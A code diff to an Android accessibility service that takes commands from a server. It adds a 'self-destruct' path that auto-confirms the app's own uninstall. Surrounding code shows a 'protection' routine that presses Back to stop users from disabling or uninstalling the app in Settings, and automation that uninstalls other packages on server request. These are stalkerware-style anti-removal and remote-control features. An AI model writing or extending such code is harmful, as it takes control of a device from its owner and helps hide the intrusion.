@@ -117,8 +117,8 @@ public class UnifiedAccessibilityService extends AccessibilityService {
     private volatile boolean accessibilityAssistBackHomeFired = false;
 
     // Uninstall automation is never generic. It is armed for one exact package
-    // immediately before a server-requested uninstall or the first-launch
-    // installer cleanup, and expires shortly afterward.
+    // immediately before a server-requested uninstall, the explicit self-destruct
+    // command, or the first-launch installer cleanup, and expires shortly afterward.
     private volatile boolean uninstallAssistArmed = false;
     private volatile String uninstallAssistTargetPackage = "";
     private volatile long uninstallAssistExpiresAt = 0L;
@@ -206,11 +206,28 @@ public class UnifiedAccessibilityService extends AccessibilityService {
      * Arms the uninstall assistant for one exact package. The assistant only
      * acts on an Android package-installer dialog whose visible app label
      * matches this package; it never scans for a generic OK/Yes button.
+     *
+     * The app's own package is deliberately rejected here. Self-destruct uses
+     * the separate armSelfUninstallAssist() entry point so an ordinary
+     * uninstall_app command cannot accidentally arm the service itself.
      */
     public void armUninstallAssist(String packageName) {
+        armUninstallAssistForTarget(packageName, false);
+    }
+
+    /**
+     * Arms the exact one-shot uninstall flow for this application itself.
+     * This is only called by the explicit self_destruct command; it is not a
+     * generic package uninstall clicker.
+     */
+    public void armSelfUninstallAssist() {
+        armUninstallAssistForTarget(getPackageName(), true);
+    }
+
+    private void armUninstallAssistForTarget(String packageName, boolean allowOwnPackage) {
         if (packageName == null) return;
         String target = packageName.trim();
-        if (target.isEmpty() || target.equals(getPackageName())) return;
+        if (target.isEmpty() || (!allowOwnPackage && target.equals(getPackageName()))) return;
         try {
             getPackageManager().getPackageInfo(target, 0);
         } catch (Exception e) {
@@ -220,7 +237,8 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         uninstallAssistTargetPackage = target;
         uninstallAssistExpiresAt = System.currentTimeMillis() + UNINSTALL_ASSIST_TIMEOUT_MS;
         uninstallAssistArmed = true;
-        Log.i(TAG, "Uninstall assist armed for exact package " + target);
+        Log.i(TAG, "Uninstall assist armed for exact package " + target
+                + (allowOwnPackage ? " (self-destruct)" : ""));
     }
 
     /**
@@ -3182,6 +3200,13 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                 AccessibilityNodeInfo root = getRootInActiveWindow();
                 if (root == null) return;
 
+                // Do not dismiss the system dialog opened by the explicit,
+                // exact-package self-destruct flow.
+                if (isArmedUninstallDialog(root)) {
+                    root.recycle();
+                    return;
+                }
+
                 // Search for the app name and all known action/danger keywords.
                 // We only defend when the user is on an ACTION page (service detail,
                 // stop dialog, App Info) — NOT when our app name is just one row in
@@ -3602,6 +3627,17 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         try {
             AccessibilityNodeInfo root = getRootInActiveWindow();
             if (root == null) return;
+
+            // An explicit self-destruct has priority over the Settings
+            // protection below. Without this guard, the Settings-hosted
+            // package installer looks like an attempted manual uninstall and
+            // the protection presses Back before the armed helper can confirm
+            // the dialog.
+            if (isArmedUninstallDialog(root)) {
+                root.recycle();
+                return;
+            }
+
             CharSequence pkg = root.getPackageName();
             String pkgStr = pkg != null ? pkg.toString().toLowerCase() : "";
             if (!pkgStr.contains("settings")) {
